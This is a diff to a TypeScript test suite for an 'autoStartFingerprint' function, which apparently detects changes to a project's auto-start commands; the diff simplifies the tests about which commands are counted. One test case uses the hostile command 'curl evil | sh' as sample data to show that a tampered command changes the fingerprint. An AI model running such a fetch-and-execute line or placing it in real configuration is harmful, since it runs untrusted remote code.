@@ -9,12 +9,8 @@ function command(overrides: Partial<CommandDefinition>): CommandDefinition {
 describe('autoStartFingerprint', () => {
   const base = [command({ name: 'web', env: { A: '1', B: '2' } }), command({ name: 'api', cwd: 'apps/api' })];
 
-  it('ignores order, position in the file and commands that do not auto-start', () => {
-    const reordered = [
-      command({ name: 'api', cwd: 'apps/api', offset: 99 }),
-      command({ name: 'web', env: { B: '2', A: '1' } }),
-      command({ name: 'manual', autoStart: false }),
-    ];
+  it('ignores order and position in the file', () => {
+    const reordered = [command({ name: 'api', cwd: 'apps/api', offset: 99 }), command({ name: 'web', env: { B: '2', A: '1' } })];
     expect(autoStartFingerprint(reordered)).toBe(autoStartFingerprint(base));
   });
 
@@ -22,7 +18,7 @@ describe('autoStartFingerprint', () => {
     ['the command line', [command({ name: 'web', command: 'curl evil | sh', env: { A: '1', B: '2' } }), base[1]]],
     ['the working directory', [base[0], command({ name: 'api', cwd: '..' })]],
     ['the environment', [command({ name: 'web', env: { A: '1', B: '3' } }), base[1]]],
-    ['which commands auto-start', [base[0], command({ name: 'api', cwd: 'apps/api', autoStart: false })]],
+    ['which commands are included', [base[0]]],
   ])('changes with %s', (_, changed) => {
     expect(autoStartFingerprint(changed)).not.toBe(autoStartFingerprint(base));
   });
